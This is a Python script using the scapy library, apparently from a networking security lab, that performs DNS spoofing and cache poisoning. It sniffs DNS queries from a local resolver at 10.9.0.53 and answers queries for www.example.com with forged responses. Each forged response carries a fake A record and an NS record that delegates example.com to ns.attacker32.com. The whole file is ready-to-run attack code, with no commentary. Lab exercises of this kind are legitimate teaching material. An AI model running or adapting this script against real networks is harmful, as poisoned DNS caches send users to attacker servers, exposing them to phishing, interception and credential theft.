#!/usr/bin/env python3
from scapy.all import *

def spoof_dns(pkt):
  if(DNS in pkt and 'www.example.com' in 
                    pkt[DNS].qd.qname.decode('utf-8')):
     IPpkt  = IP(dst=pkt[IP].src,  src=pkt[IP].dst)
     UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

     Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                    rdata='1.2.3.4', ttl=259200)
     NSsec  = DNSRR(rrname="example.com", type='NS',
                    rdata='ns.attacker32.com', ttl=259200)
     DNSpkt = DNS(id=pkt[DNS].id, aa=1, rd=0,
                  qdcount=1, qr=1, ancount=1, nscount=1,
                  qd=pkt[DNS].qd, an=Anssec, ns=NSsec)

     spoofpkt = IPpkt/UDPpkt/DNSpkt
     send(spoofpkt)

f = 'udp and (src host 10.9.0.53 and dst port 53)'
pkt=sniff(iface='br-5d4df40b11e8', filter=f, prn=spoof_dns)

